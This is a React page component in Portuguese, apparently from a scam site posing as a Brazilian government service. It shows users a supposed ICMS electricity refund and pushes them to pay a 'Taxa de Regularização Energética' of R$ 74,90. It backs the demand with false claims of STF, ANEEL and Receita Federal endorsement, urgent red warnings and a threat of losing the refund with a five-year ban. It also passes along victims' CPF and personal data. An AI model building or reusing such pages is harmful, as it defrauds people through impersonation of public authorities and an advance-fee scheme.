import { useState, useEffect } from "react";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { Button } from "@/components/ui/button";
import { Coins, User, Building, MapPin, ChevronRight, Calendar, Clock, CheckCircle, AlertCircle, AlertTriangle, Info, X } from "lucide-react";
import { Card, CardContent } from "@/components/ui/card";
import { Dialog, DialogContent } from "@/components/ui/dialog";
import { useLocation } from "wouter";
import { useUserData } from "@/contexts/UserContext";

export default function ConfirmacaoRestituicao() {
  // Hook de navegação do wouter
  const [location, navigate] = useLocation();
  
  // Obter dados do contexto do usuário
  const { userData, updateUserData } = useUserData();
  
  // Estado para controle de diálogo
  const [dialogOpen, setDialogOpen] = useState(false);
  
  // Obter dados do usuário do contexto global
  const nome = userData.nome || "";
  const cpf = userData.cpf || "";
  const companhia = userData.companhia || "";
  const estado = userData.estado || "";
  const dataNascimento = userData.dataNascimento || "";
  const valorRestituicao = userData.valorRestituicao ? Math.round(parseFloat(userData.valorRestituicao.toString()) * 100) : 0;
  const valorMedio = userData.valorConta?.toString() || "";
  const meses = userData.periodo?.toString() || "";
  const dataPrevista = userData.dataPrevista || "";
  
  // useEffect para verificar se temos dados necessários no contexto
  useEffect(() => {
    // Verificar se temos dados necessários
    if (!cpf || !nome) {
      console.log("Dados insuficientes no contexto, redirecionando para verificação");
      navigate("/verificar");
      return;
    }
    
    // Se não temos data prevista, definir uma
    if (!dataPrevista) {
      const novaDataPrevista = calcularDataPrevisao();
      updateUserData({
        dataPrevista: novaDataPrevista
      });
    }
    
    console.log("Dados do usuário na página de confirmação:", {
      cpf,
      nome,
      companhia,
      estado,
      dataNascimento,
      valorRestituicao,
      meses,
      dataPrevista
    });
  }, [cpf, nome, navigate, updateUserData, dataPrevista]);

  // Função para calcular a data de previsão - exatamente 72 horas (3 dias) a partir da data/hora atual
  const calcularDataPrevisao = () => {
    const hoje = new Date();
    
    // Adicionar exatamente 72 horas (3 dias)
    const dataFutura = new Date(hoje.getTime() + (72 * 60 * 60 * 1000));
    
    const dia = dataFutura.getDate().toString().padStart(2, '0');
    const mes = (dataFutura.getMonth() + 1).toString().padStart(2, '0');
    const ano = dataFutura.getFullYear();
    
    return `${dia}/${mes}/${ano}`;
  };

  // Formatar CPF
  const formatarCPF = (cpf: string) => {
    if (!cpf) return "";
    return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
  };

  // Formatar valor monetário com separador de milhar
  const formatarMoeda = (valor: number) => {
    // Converter para valor formatado com separador de milhar e vírgula como decimal
    const valorEmReais = (valor / 100).toFixed(2);
    const partes = valorEmReais.split('.');
    
    // Adicionar separador de milhar
    partes[0] = partes[0].replace(/\B(?=(\d{3})+(?!\d))/g, ".");
    
    return `R$ ${partes.join(',')}`;
  };

  // Formatar data
  const formatarData = (data: string) => {
    // Verificar se a data é válida
    if (!data) return "";
    
    // Remover qualquer undefined da string
    const dataLimpa = data.replace(/undefined/g, "");
    
    // Se depois de limpar não sobrou nada útil
    if (!dataLimpa || dataLimpa.trim() === "/" || dataLimpa.trim() === "//") return "";
    
    try {
      // Tentar formatar se tiver o formato YYYY-MM-DD
      if (dataLimpa.includes("-") && dataLimpa.length >= 10) {
        const [ano, mes, dia] = dataLimpa.substring(0, 10).split('-');
        if (ano && mes && dia) {
          return `${dia}/${mes}/${ano}`;
        }
      }
      
      // Se não conseguir formatar, retornar a data limpa
      return dataLimpa;
    } catch {
      // Em caso de erro, retornar string vazia
      return "";
    }
  };

  const prosseguirParaPagamento = () => {
    // Os dados já estão no contexto, não precisamos passá-los por URL
    // Vamos apenas registrar o que estamos passando para próxima tela para fins de debug
    console.log("Prosseguindo para página de pagamento com os dados:", {
      cpf, 
      nome, 
      valorRestituicao,
      dataNascimento,
      companhia,
      estado
    });
    
    // Navegar diretamente para a página de pagamento sem parâmetros URL
    navigate("/pagamento");
  };

  return (
    <div className="min-h-screen flex flex-col">
      <Header />
      
      <main className="flex-1 container max-w-5xl mx-auto px-4 py-8">
        <div className="grid grid-cols-1 md:grid-cols-[2fr_1fr] gap-6">
          <div className="space-y-6">
            <h1 className="text-2xl md:text-3xl font-bold text-[var(--gov-blue-dark)]">
              Resultado do Cálculo de Restituição
            </h1>
            
            <Card className="overflow-hidden">
              <div className="bg-gradient-to-b from-green-50 to-green-100 p-5 border-b border-green-200 rounded-t-md">
                <div className="flex items-center justify-center mb-2">
                  <div className="bg-green-100 p-2 rounded-full border border-green-200">
                    <CheckCircle className="text-green-600 h-6 w-6" />
                  </div>
                </div>

                <h3 className="font-bold text-green-800 text-xl mb-1 text-center">
                  Restituição Disponível!
                </h3>
                
                <div className="h-0.5 w-24 bg-green-200 mx-auto my-2"></div>
                
                <h2 className="text-lg font-semibold text-[var(--gov-blue-dark)] text-center mb-3">
                  Valor disponível para Restituição
                </h2>
                
                <div className="bg-white p-4 rounded-md shadow-sm border border-green-200 mb-2 flex flex-col items-center">
                  <div className="flex items-center justify-center">
                    <Coins className="h-8 w-8 text-green-600 mr-2" />
                    <span className="text-3xl font-bold text-green-600">
                      {formatarMoeda(valorRestituicao)}
                    </span>
                  </div>
                  
                  {meses && (
                    <p className="text-xs text-[var(--gov-gray-dark)] mt-2 text-center">
                      Valor calculado com base em <span className="font-semibold">{meses} meses</span> de cobranças indevidas
                    </p>
                  )}
                </div>
              </div>
              
              <CardContent className="p-6 space-y-6">
                <div className="mb-8">
                  <h3 className="text-xl font-bold text-[#044785] mb-4">
                    <AlertCircle className="inline-block mr-2 h-5 w-5" />
                    Informações Importantes sobre a Restituição da ANEEL
                  </h3>
                  <div className="space-y-5">
                    <div className="info-box pl-4 py-3 relative border border-gray-100 rounded-md shadow-sm">
                      <div className="absolute left-0 top-0 bottom-0 w-1 bg-[#044785]"></div>
                      <h4 className="text-lg font-semibold text-[#2c5985] pl-3">Por que estou pagando uma taxa se o valor é meu por direito?</h4>
                      <p className="text-gray-700 mb-2 pl-3">A TRE é uma exigência operacional imposta pelos órgãos públicos para garantir a segurança da liberação, evitando fraudes, duplicidades e erros de restituição.</p>
                    </div>
                    <div className="info-box pl-4 py-3 relative border border-gray-100 rounded-md shadow-sm">
                      <div className="absolute left-0 top-0 bottom-0 w-1 bg-[#044785]"></div>
                      <h4 className="text-lg font-semibold text-[#2c5985] pl-3">A restituição é garantida após o pagamento da TRE?</h4>
                      <p className="text-gray-700 mb-2 pl-3">Sim. Após a confirmação, o valor de {formatarMoeda(valorRestituicao)} será depositado em até 72 horas úteis, conforme calendário de restituição oficial.</p>
                    </div>
                    <div className="info-box pl-4 py-3 relative border border-gray-100 rounded-md shadow-sm">
                      <div className="absolute left-0 top-0 bottom-0 w-1 bg-[#044785]"></div>
                      <h4 className="text-lg font-semibold text-[#2c5985] pl-3">Como sei que isso é oficial?</h4>
                      <p className="text-gray-700 mb-2 pl-3">Todo o processo está amparado por decisão do STF, regulamentado pela Lei Complementar nº 194/2022, e validado pela ANEEL e Receita Federal.</p>
                    </div>
                  </div>
                  <div className="bg-red-50 p-4 rounded-md border border-red-300 text-red-800 mt-6">
                    <p className="flex items-start">
                      <AlertCircle className="text-red-600 mr-2 mt-1 h-5 w-5 flex-shrink-0" />
                      <span><strong>ATENÇÃO:</strong> Sua solicitação ainda não foi confirmada devido à falta de pagamento da Taxa de Regularização Energética (TRE). Para garantir sua restituição é necessário efetuar o pagamento imediatamente.</span>
                    </p>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>
          
          <div className="space-y-6">
            <Card>
              <CardContent className="p-6 space-y-4">
                <h3 className="text-lg font-semibold text-[var(--gov-blue-dark)]">
                  Informações do Processo
                </h3>
                
                <div className="flex items-start space-x-3 border-b border-gray-100 pb-3">
                  <Clock className="h-5 w-5 text-[var(--gov-blue)] mt-0.5" />
                  <div>
                    <p className="text-sm text-[var(--gov-gray-dark)]">Previsão para Recebimento</p>
                    <p className="font-medium">{dataPrevista}</p>
                  </div>
                </div>
                
                <div className="flex items-start space-x-3 border-b border-gray-100 pb-3">
                  <AlertCircle className="h-5 w-5 text-amber-500 mt-0.5" />
                  <div>
                    <p className="text-sm text-[var(--gov-gray-dark)]">Status do Processo</p>
                    <p className="font-medium text-amber-600">Pendente</p>
                  </div>
                </div>
                
                <Button 
                  onClick={() => setDialogOpen(true)}
                  className="w-full bg-[var(--gov-blue)] hover:bg-[var(--gov-blue)]/90 mt-4 text-white font-bold py-3"
                >
                  PAGAR TAXA E CONCLUIR
                  <ChevronRight className="ml-2 h-4 w-4" />
                </Button>
              </CardContent>
            </Card>
          </div>
        </div>
      </main>
      
      <Dialog open={dialogOpen} onOpenChange={setDialogOpen}>
        <DialogContent className="p-0 overflow-hidden max-w-[450px] border-0">
          <div className="w-full">
            {/* Cabeçalho */}
            <div className="bg-gradient-to-r from-red-600 to-red-700 p-5 text-center">
              <div className="bg-white rounded-full h-14 w-14 flex items-center justify-center mx-auto mb-3 shadow-md">
                <AlertCircle className="text-red-600 h-8 w-8" />
              </div>
              <h3 className="text-xl font-bold text-white">AVISO IMPORTANTE</h3>
            </div>
            
            {/* Conteúdo */}
            <div className="p-6 bg-white">
              <div className="space-y-4 text-gray-700">
                <p>Ao prosseguir, você autoriza a inclusão do seu CPF na lista de participantes do processo de restituição do ICMS e concorda com o pagamento obrigatório de <strong className="text-red-600 font-bold">R$ 74,90</strong>.</p>
                
                <p className="mt-4">
                  <strong className="text-red-700">Atenção:</strong> O não pagamento até a data de vencimento poderá resultar na perda de até <strong className="text-red-600">{formatarMoeda(valorRestituicao)}</strong> em restituições e impedir novas solicitações por até 5 anos.
                </p>
                
                <p className="mt-4 text-sm text-gray-600">
                  <strong>Importante:</strong> Essa taxa cobre os custos administrativos para validação e andamento do processo de restituição junto aos órgãos responsáveis.
                </p>
              </div>
              
              <div className="mt-6 grid grid-cols-1 gap-3">
                <Button 
                  onClick={prosseguirParaPagamento}
                  className="w-full px-6 py-4 bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white rounded-md transition-colors font-bold text-lg shadow-sm"
                >
                  Vou realizar o pagamento
                </Button>
                <Button 
                  variant="outline"
                  onClick={() => setDialogOpen(false)}
                  className="w-full px-6 py-3 border border-gray-300 text-gray-700 rounded-md hover:bg-gray-50 transition-colors font-medium"
                >
                  Retornar ao processo
                </Button>
              </div>
            </div>
          </div>
        </DialogContent>
      </Dialog>
      
      <Footer />
    </div>
  );
}